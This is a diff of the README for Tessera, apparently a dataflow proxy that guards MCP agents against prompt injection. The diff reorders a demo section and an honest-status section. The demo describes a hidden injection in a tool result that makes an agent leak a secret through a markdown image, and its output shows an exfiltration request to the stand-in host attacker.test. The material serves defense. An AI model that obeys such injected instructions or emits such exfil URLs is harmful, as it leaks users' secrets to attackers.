@@ -14,46 +14,33 @@ approval.
 > data or informed human approval. It does **not** try to prevent prompt
 > injection in-band. That is unsolvable, and claiming otherwise is snake oil.
 
+## See it: the secret walks out, then it doesn't
+
+The whole point in one run. A tool returns a document that hides a prompt
+injection -- an instruction to leak a held secret through a markdown image.
+Under a normal MCP setup the agent obeys, and the secret is exfiltrated. Put
+Tessera in front and the *same* attack is blocked at the dataflow layer, with
+the ledger showing exactly why -- no change to the agent, no reliance on the
+model noticing anything.
+
+```bash
+python examples/markdown_exfil_demo.py
+```
+
+```text
+without Tessera:  rendered image -> GET https://attacker.test/log?d=<secret>   leaked
+with Tessera:     [DENY] untrusted web_content cannot flow into an exfil sink
+                  ledger: labeled web_content UNTRUSTED -> flow-rule DENY -> sanitized 1 url
+```
+
+That is the only thing you have to believe to care about the rest: **the leak
+happens by default, and Tessera stops it without the agent's cooperation.**
+
+## Quick start
+
 ```bash
 pip install tessera-proxy
 ```
-
-## Honest status: what works, and what's still early
-
-This is alpha, and the project's whole reason for existing is threat-model
-honesty -- so here is the straight version before you adopt it.
-
-**The security guarantee is real and verified.** The flow rule works
-mechanically: untrusted data cannot reach an exfiltration-capable or
-irreversible tool argument without passing a declassifier or a human. That is
-covered by 230+ tests (including the laundering paths), and on
-[AgentDojo](https://github.com/ethz-spylab/agentdojo) -- the standard
-third-party prompt-injection benchmark -- Tessera drove attack success rate to
-**0%** on the slices we ran (details [below](#the-evidence-agentdojo)).
-
-**The usability cost is significant, and not yet validated in the wild.**
-Containing those attacks also blocked a large fraction of *legitimate* work in
-the same benchmark (task success under attack fell to ~33% in the strict modes).
-That tax is the honest price of the guarantee today. Worse, we have **zero
-real-world users yet** -- every number here is from a benchmark or our own
-tests, so the true tax on *your* agent and *your* tools is unknown. It could be
-better or worse.
-
-**So: is this for you right now?**
-
-| Use Tessera today if...                                                   | Hold off if...                                              |
-| ------------------------------------------------------------------------- | ----------------------------------------------------------- |
-| Your agent takes **irreversible or data-exfiltrating actions** (sends money, email, deletes, posts) | Your agent only reads / answers and never takes risky actions |
-| ...on data read from **untrusted sources** (inboxes, web pages, documents) | All your tool data comes from sources you fully trust       |
-| You would genuinely rather **over-block than leak**, and can tune per toolset | You need zero-friction, no-config behavior out of the box   |
-| You want an **append-only audit ledger** of why each action was allowed/blocked | You can't yet absorb some legitimate-task breakage          |
-
-Tessera is, today, a **high-assurance safety net for high-stakes agents that opt
-in** -- not yet a universal "every dev should add this" library. The plan-mode
-path ([below](#the-plan-interpreter-containment-by-construction)) is the route
-to lower tax, and reducing that tax on real agents is the project's main focus.
-
-## Quick start
 
 **The front door -- a transparent MCP proxy.** Drop Tessera in front of any MCP
 server. Your agent points at `tessera` instead of the upstream server; *nothing
@@ -89,17 +76,40 @@ applies it in-process. `policy` is `"paranoid"` / `"balanced"` (default) /
 `"permissive"`. Configure trusted sources (`guard.trust("internal_db")`),
 declassifiers, and capabilities on the returned `Guard`.
 
-## See it in 30 seconds
+## Honest status: what works, and what's still early
 
-```bash
-python examples/markdown_exfil_demo.py
-```
+This is alpha, and the project's whole reason for existing is threat-model
+honesty -- so here is the straight version before you adopt it.
 
-A markdown-image exfiltration of a held secret that **sails through vanilla
-MCP** and is **blocked by Tessera** at the dataflow layer -- with the audit
-trail showing exactly why. This is the whole pitch in one run: the secret walks
-out under a normal MCP setup, and Tessera stops it without the agent's
-cooperation.
+**The security guarantee is real and verified.** The flow rule works
+mechanically: untrusted data cannot reach an exfiltration-capable or
+irreversible tool argument without passing a declassifier or a human. That is
+covered by 230+ tests (including the laundering paths), and on
+[AgentDojo](https://github.com/ethz-spylab/agentdojo) -- the standard
+third-party prompt-injection benchmark -- Tessera drove attack success rate to
+**0%** on the slices we ran (details [below](#the-evidence-agentdojo)).
+
+**The usability cost is significant, and not yet validated in the wild.**
+Containing those attacks also blocked a large fraction of *legitimate* work in
+the same benchmark (task success under attack fell to ~33% in the strict modes).
+That tax is the honest price of the guarantee today. Worse, we have **zero
+real-world users yet** -- every number here is from a benchmark or our own
+tests, so the true tax on *your* agent and *your* tools is unknown. It could be
+better or worse.
+
+**So: is this for you right now?**
+
+| Use Tessera today if...                                                   | Hold off if...                                              |
+| ------------------------------------------------------------------------- | ----------------------------------------------------------- |
+| Your agent takes **irreversible or data-exfiltrating actions** (sends money, email, deletes, posts) | Your agent only reads / answers and never takes risky actions |
+| ...on data read from **untrusted sources** (inboxes, web pages, documents) | All your tool data comes from sources you fully trust       |
+| You would genuinely rather **over-block than leak**, and can tune per toolset | You need zero-friction, no-config behavior out of the box   |
+| You want an **append-only audit ledger** of why each action was allowed/blocked | You can't yet absorb some legitimate-task breakage          |
+
+Tessera is, today, a **high-assurance safety net for high-stakes agents that opt
+in** -- not yet a universal "every dev should add this" library. The plan-mode
+path ([below](#the-plan-interpreter-containment-by-construction)) is the route
+to lower tax, and reducing that tax on real agents is the project's main focus.
 
 ## The problem
 
